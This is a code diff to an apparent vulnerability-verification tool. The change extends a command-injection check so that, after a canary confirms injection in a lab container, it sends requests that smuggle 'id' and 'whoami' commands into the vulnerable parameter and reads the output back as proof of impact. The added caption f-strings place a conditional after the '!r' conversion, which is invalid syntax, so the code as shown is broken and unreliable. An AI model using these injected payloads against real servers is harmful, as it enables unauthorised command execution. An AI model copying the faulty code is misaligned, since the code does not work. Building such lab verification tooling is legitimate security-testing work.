@@ -1122,28 +1122,70 @@ def verify_generic_command_injection(
 
         res.evidence["intentos"] = tried
         if found:
+            # ── Impact proof: run `id` and `whoami` via the same injection ──
+            _id_output = ""
+            _whoami_output = ""
+            _pname_win = res.evidence.get("parametro_ganador", "")
+            _form_win  = res.evidence.get("payload_ganador", "")
+            _sep = ""
+            # Extract the separator from the winning payload (;, |, &&, \n, $())
+            for _s in ("; ", "| ", "|| ", "&& ", "\n", "`", "$("):
+                if _form_win.startswith(_s.strip()) or f"{_s}" in _form_win:
+                    _sep = _s.rstrip(); break
+            if not _sep:
+                _sep = ";"
+            try:
+                _id_path = f"/tmp/binoracle_id_{_token()}.txt"
+                _who_path = f"/tmp/binoracle_who_{_token()}.txt"
+                _id_payload = dict(parameters) if isinstance(parameters, dict) else {}
+                _id_payload[_pname_win] = f"{_sep} id > {_id_path}"
+                _http_request(m, base_url + endpoint, timeout=10,
+                              data=_id_payload if m != "GET" else None,
+                              params=_id_payload if m == "GET" else None,
+                              headers=custom_headers or None)
+                time.sleep(1)
+                _id_output = lab.read_file(container, _id_path).strip()
+
+                _who_payload = dict(parameters) if isinstance(parameters, dict) else {}
+                _who_payload[_pname_win] = f"{_sep} whoami > {_who_path}"
+                _http_request(m, base_url + endpoint, timeout=10,
+                              data=_who_payload if m != "GET" else None,
+                              params=_who_payload if m == "GET" else None,
+                              headers=custom_headers or None)
+                time.sleep(1)
+                _whoami_output = lab.read_file(container, _who_path).strip()
+            except Exception:
+                pass
+            res.evidence["rce_id_output"]     = _id_output
+            res.evidence["rce_whoami_output"] = _whoami_output
+            # ──────────────────────────────────────────────────────────────
+
             res.verified = True
             res.ok = True
             res.detail = (f"COMMAND INJECTION confirmada: el payload en el parametro "
                           f"'{res.evidence['parametro_ganador']}' hizo que {canary_path} "
                           f"apareciera DENTRO del contenedor con el secreto exacto -- prueba "
-                          f"inequivoca de ejecucion de comandos, no una deduccion por status code")
+                          f"inequivoca de ejecucion de comandos, no una deduccion por status code"
+                          + (f"; id={_id_output!r}" if _id_output else ""))
             _ci_url = base_url + endpoint
-            _ci_body = (f"COMMAND INJECTION — CANARIO CONFIRMADO\n\n"
-                        f"Parametro: {res.evidence.get('parametro_ganador','')}\n"
-                        f"Payload: {res.evidence.get('payload_ganador','')}\n\n"
-                        f"Verificacion: docker exec -> {canary_path}\n"
-                        f"Secreto plantado '{secret}' encontrado dentro del contenedor.\n\n"
-                        f"Respuesta HTTP (primer intento):\n"
+            _ci_body = (f"COMMAND INJECTION — IMPACTO REAL CONFIRMADO\n\n"
+                        f"{'─'*52}\n"
+                        f"Parametro    : {res.evidence.get('parametro_ganador','')}\n"
+                        f"Payload      : {res.evidence.get('payload_ganador','')}\n"
+                        f"Canario      : {canary_path} → '{secret}'\n\n"
+                        + (f"$ id\n{_id_output}\n" if _id_output else "")
+                        + (f"$ whoami\n{_whoami_output}\n" if _whoami_output else "")
+                        + f"\nRespuesta HTTP (primer intento):\n"
                         f"{res.evidence.get('respuesta_cuerpo_recorte','')[:300]}")
+            _highlight_ci = _id_output or _whoami_output or secret
             _add_exploit_evidence(
                 res=res, method=m, url=_ci_url,
                 resp_or_body=_ci_body,
-                highlight=secret,
+                highlight=_highlight_ci,
                 caption_es=(f"COMMAND INJECTION confirmada: payload en '{res.evidence.get('parametro_ganador','')}' "
-                            f"ejecuto comando en el servidor — secreto '{secret}' encontrado en {canary_path}."),
+                            f"ejecuto comando en el servidor — id={_id_output!r if _id_output else '(ver canario)'}"),
                 caption_en=(f"COMMAND INJECTION confirmed: payload in '{res.evidence.get('parametro_ganador','')}' "
-                            f"executed server command — secret '{secret}' found in {canary_path}."),
+                            f"executed server command — id={_id_output!r if _id_output else '(see canary)'}"),
                 extra_terminal=_ci_body,
             )
         else:
